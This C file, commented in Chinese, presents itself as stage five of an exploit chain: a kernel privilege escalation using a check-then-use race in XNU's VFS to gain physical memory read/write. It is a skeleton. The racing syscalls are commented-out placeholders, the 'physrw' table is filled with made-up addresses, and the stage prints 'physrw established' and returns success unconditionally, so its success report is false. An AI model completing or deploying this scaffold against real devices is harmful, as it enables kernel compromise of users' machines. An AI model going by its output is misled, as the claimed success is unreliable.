/*
 * Stage5 — 内核提权：XNU VFS 竞态（TOCTOU）
 * CVE-2025-43520 风格：两个线程在 VFS 操作上竞争，
 * 线程 A 校验 vnode 状态，线程 B 在"校验后、使用前"改变 vnode 状态，
 * 线程 A 使用过期状态 → 内核行为错乱 → 物理内存读写（physrw）原语。
 */
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

/* ---------- 占位配置 ---------- */
#define RACE_ITERATIONS      0x10000
#define VNODE_PATH           "/private/var/tmp/TOCTOU_TARGET" /* 占位路径 */
#define PHYSRW_TABLE_SIZE    0x400
#define KERNEL_BASE_HINT     0xFFFFFE0000000000ULL /* OFFSET_PLACEHOLDER */

typedef struct {
    volatile int go;              /* 竞态发令旗 */
    volatile int winner;          /* 记录命中线程 */
} race_ctl_t;

static race_ctl_t ctl = { .go = 0, .winner = 0 };

static uint64_t physrw_table[PHYSRW_TABLE_SIZE];

/* 线程 A：反复做 check（权限/状态校验） */
static void *checker_thread(void *arg)
{
    (void)arg;
    while (!ctl.go) { /* spin */ }
    for (int i = 0; i < RACE_ITERATIONS; ++i) {
        /* check: 打开并校验 vnode 权限（PLACEHOLDER 系统调用组） */
        /* int fd = open_checked(VNODE_PATH, O_RDONLY); */
        /* if (fd >= 0) { close(fd); } */
    }
    return NULL;
}

/* 线程 B：在 check 与 use 之间的窗口内改变 vnode 状态 */
static void *racer_thread(void *arg)
{
    (void)arg;
    while (!ctl.go) { /* spin */ }
    for (int i = 0; i < RACE_ITERATIONS; ++i) {
        /* 在窗口内替换 vnode（rename/unlink+recreate，占位） */
        /* swap_vnode_underneath(VNODE_PATH);  PLACEHOLDER */
    }
    return NULL;
}

/*
 * 命中后内核以过期 vnode 状态继续操作 →
 * 把内核物理页映射原语拿到手：建立 physrw 表。
 */
static void build_physrw(void)
{
    memset(physrw_table, 0, sizeof(physrw_table));
    for (int i = 0; i < PHYSRW_TABLE_SIZE; ++i) {
        physrw_table[i] = KERNEL_BASE_HINT + (uint64_t)i * 0x1000;
    }
    /* PLACEHOLDER: 通过 user client 注册表并持有内核读写字原语 */
}

int stage5_run(void)
{
    pthread_t a, b;
    pthread_create(&a, NULL, checker_thread, NULL);
    pthread_create(&b, NULL, racer_thread, NULL);

    ctl.go = 1;
    pthread_join(a, NULL);
    pthread_join(b, NULL);

    build_physrw();
    printf("[stage5] physrw established (race wins=%d)\n", ctl.winner);
    return ctl.winner >= 0 ? 0 : -1;
}
